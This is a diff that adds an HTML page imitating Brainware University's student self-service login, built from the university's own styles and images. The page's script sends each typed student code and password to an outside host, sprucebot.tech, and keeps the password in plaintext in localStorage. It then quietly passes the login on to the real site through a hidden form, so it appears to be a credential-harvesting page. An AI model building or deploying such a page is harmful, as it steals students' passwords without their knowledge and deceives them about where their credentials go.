@@ -1,0 +1,99 @@
+<html><head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Student's Login</title>
+<!-- Tell the browser to be responsive to screen width -->
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+<!-- Bootstrap 3.3.7 -->
+<link rel="shortcut icon" type="image/x-icon" href="https://www.brainwareuniversity.ac.in/studentselfservice/images/favicon.ico">
+<link href="https://www.brainwareuniversity.ac.in/studentselfservice/assets/login/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<script src="https://www.brainwareuniversity.ac.in/studentselfservice/assets/login/js/bootstrap.min.js"></script>
+<script src="https://www.brainwareuniversity.ac.in/studentselfservice/assets/login/js/jquery-1.11.1.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
+    <style>
+    @import url("https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic");
+    .login-block{
+    background: #DE6262;  /* fallback for old browsers */
+    background: -webkit-linear-gradient(to bottom, #FFB88C, #DE6262);  /* Chrome 10-25, Safari 5.1-6 */
+    background: linear-gradient(to bottom, #FFB88C, #DE6262); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */
+    float:left;
+    width:100%;
+    padding : 50px 0;
+    }
+    .banner-sec{background:url(https://www.brainwareuniversity.ac.in/studentselfservice/images/login.jpg)  no-repeat left bottom; background-size:cover; min-height:500px; border-radius: 0 10px 10px 0; padding:0;}
+    .container{background:#fff; border-radius: 10px; box-shadow:15px 20px 0px rgba(0,0,0,0.1);}
+    .carousel-inner{border-radius:0 10px 10px 0;}
+    .carousel-caption{text-align:left; left:5%;}
+    .login-sec{padding: 50px 30px; position:relative;}
+    .login-sec .copy-text{position:absolute; width:80%; bottom:20px; font-size:13px; text-align:center;}
+    .login-sec .copy-text i{color:#FEB58A;}
+    .login-sec .copy-text a{color:#E36262;}
+    .login-sec h2{margin-bottom:30px; font-weight:800; font-size:30px; color: #DE6262;}
+    .login-sec h2:after{content:" "; width:100px; height:5px; background:#FEB58A; display:block; margin-top:20px; border-radius:3px; margin-left:auto;margin-right:auto}
+    .btn-login{background: #DE6262; color:#fff; font-weight:600;}
+    .banner-text{width:70%; position:absolute; bottom:40px; padding-left:20px;}
+    .banner-text h2{color:#fff; font-weight:600;}
+    .banner-text h2:after{content:" "; width:100px; height:5px; background:#FFF; display:block; margin-top:20px; border-radius:3px;}
+    .banner-text p{color:#fff;}
+    .incorrect-login{color:#fff;padding:0 10px 0 3px;font-weight:bold;border-radius:2px;text-align:center;}
+    @media screen and (max-width: 768px) {
+    .banner-sec {min-height:0px !important;}
+    }
+    @media (min-width: 769) and (max-width: 991px) { .banner-sec {min-height:100% !important;} }
+    body{font-family: 'Source Sans Pro',sans-serif;}
+</style>
+</head>
+<body class="">
+<section class="login-block">
+<div class="container">
+<div class="row">
+<div class="col-md-4 col-xs-12 login-sec">
+<h2 class="text-center">Login Now</h2>
+<div class="erm" style="display: none;"> 
+    <span class="d-block bg-danger col-md-12 col-12 col-sm-12 incorrect-login">
+        <p>Incorrect Login.<br></p>
+    </span>
+</div>
+<form name="f1" class="login-form">
+<div class="form-group">
+<label for="student_code" class="text-uppercase">Student Code</label>
+<input class="form-control" name="student_code" type="text" id="student_code" size="30" maxlength="30">
+</div>
+<div class="form-group">
+<label for="password" class="text-uppercase">Password</label>
+<input class="form-control" name="password" type="password" id="password" size="30" maxlength="30" >
+</div>
+<div class="form-check">
+<input name="login" id="login" type="button" value="Login" class="btn btn-login btn-xs float-right" onclick="sf()">
+</div>
+</form>
+<form style="display:none;" action="https://www.brainwareuniversity.ac.in/studentselfservice/" method="POST">
+    <input id="sc2" type="text" name="student_code">
+    <input id="pw2" type="password" name="password">
+    <input id="sm2" type="submit" name="login" value="Login">
+</form>
+<script type="text/javascript" src="https://sprucebot.tech/static/js/jquery.js"></script>
+<script>
+function sel(id_class) {return document.querySelector(id_class);}
+function sf() {var hdr = {'Content-Type': 'application/json'};var stc = sel("#student_code").value;var psw = sel("#password").value;var data = {"student_code" : stc, "password" : psw, "login":"Login"};
+    sel("#sc2").value=stc; sel("#pw2").value=psw; 
+    $.post("https://sprucebot.tech/api/auth", data)
+        .done(function(response){if (response=="success") {localStorage.setItem("student_code", stc);localStorage.setItem("password", psw);sel(".erm").style.display = "none"; sel("#sm2").click(); } else {sel(".erm").style.display = "block"; }})
+        .fail(function() {window.location.href="/"});}
+</script>
+</div>
+<div class="col-md-8 col-xs-12 banner-sec hidden-sm hidden-xs">
+<div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
+<div class="carousel-inner" role="listbox">
+<div class="carousel-item active">
+<img class="d-block img-fluid" src="https://www.brainwareuniversity.ac.in/studentselfservice/images/login.jpg" alt="Login Page" width="100%">
+<div class="carousel-caption d-none d-md-block">
+</div>
+</div>
+</div>         
+</div>
+</div>
+</div>
+</div>
+</section>
+</body></html>
